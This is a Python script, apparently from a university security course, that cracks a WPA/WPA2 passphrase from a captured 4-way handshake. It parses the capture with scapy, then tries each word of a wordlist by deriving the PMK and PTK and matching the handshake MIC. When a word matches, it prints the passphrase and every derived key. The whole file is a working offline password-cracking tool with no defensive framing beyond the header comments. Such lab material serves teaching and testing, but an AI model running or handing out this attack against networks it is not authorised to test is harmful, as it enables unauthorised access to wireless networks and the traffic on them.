#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
- Derive WPA keys from Passphrase and 4-way handshake info

- Calculate an authentication MIC (the mic for data transmission uses the
Michael algorithm. In the case of authentication, we use SHA-1 or MD5)
"""

__author__ = "Abraham Rubinstein"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "abraham.rubinstein@heig-vd.ch"
__status__ = "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
import hmac, hashlib

from scapy.layers.eap import EAPOL

#Set to true to skip most of the wrong passphrases
DEBUG = False

def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa = rdpcap("wpa_handshake.cap")

# Important parameters for key derivation - most of them can be obtained from the pcap file
dictionary = "francais.txt"  # this is the dictionary containing all words to test
A = "Pairwise key expansion"  # this string is used in the pseudo-random function
ssid = wpa[0].info  # SWI
APmac = a2b_hex(wpa[0].addr2.replace(':', ''))  # cebcc8fdcab7
Clientmac = a2b_hex(wpa[1].addr1.replace(':', ''))  # 0013efd015bd

# Authenticator and Supplicant Nonces
ANonce = wpa[5].load[13:45]  # 90773b9a9661fee1f406e8989c912b45b029c652224e8b561417672ca7e0fd91
SNonce = wpa[6].load[13:45]  # 7b3826876d14ff301aee7c1072b5e9091e21169841bce9ae8a3f24628f264577

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = b2a_hex(wpa[8].load[-18:-2]).decode('utf-8')  # "36eef66540fa801ceee2fea9b7929b40"
B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce,
                                                                              SNonce)  # used in pseudo-random function
data = a2b_hex(
    scapy.utils.linehexdump(wpa[8][EAPOL], 0, 1, True).replace(" ", "").lower().replace(
        mic_to_test, "0" * len(
            mic_to_test)))  # 0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

# This will extract the MIC type info from the Key Information Field,
# a value of 2 means HMAC-SHA1, 1 means HMAC-MD5
KIF_MIC_type = wpa[5].load[2] & 0b111

print("\n\nValues used to derivate keys")
print("============================")
print("Dictionary file : ", dictionary, "\n")
print("SSID: ", ssid, "\n")
print("AP Mac: ", b2a_hex(APmac), "\n")
print("CLient Mac: ", b2a_hex(Clientmac), "\n")
print("AP Nonce: ", b2a_hex(ANonce), "\n")
print("Client Nonce: ", b2a_hex(SNonce), "\n")


for i, passPhrase in enumerate(open(dictionary)):
    passPhrase = passPhrase.strip('\n')

    if i % 100 == 0:
        print("words attempted : %d, current word : \"%s\"" % (i,passPhrase))
    if i < 3300 and DEBUG:
        continue
    elif i > 3400 and DEBUG:
        exit()

    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2(hashlib.sha1, passPhrase.encode(), ssid, 4096, 32)

    # expand pmk to obtain PTK
    ptk = customPRF512(pmk, str.encode(A), B)

    # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK (support for SHA1 and MD5)
    mic = hmac.new(ptk[0:16], data, hashlib.sha1 if KIF_MIC_type == 2 else hashlib.md5)


    ## if the computed MIC matches the given MIC, we're done, otherwise, we loop again
    if mic.hexdigest()[:-8] != mic_to_test:
        continue
    print("FOUND A KEY : \"%s\"" % (passPhrase))

    print("\nResults of the key expansion")
    print("=============================")
    print("PMK:\t\t", pmk.hex(), "\n")
    print("PTK:\t\t", ptk.hex(), "\n")
    print("KCK:\t\t", ptk[0:16].hex(), "\n")
    print("KEK:\t\t", ptk[16:32].hex(), "\n")
    print("TK:\t\t", ptk[32:48].hex(), "\n")
    print("MICK:\t\t", ptk[48:64].hex(), "\n")
    print("MIC:\t\t", mic.hexdigest(), "\n")
    exit(0)
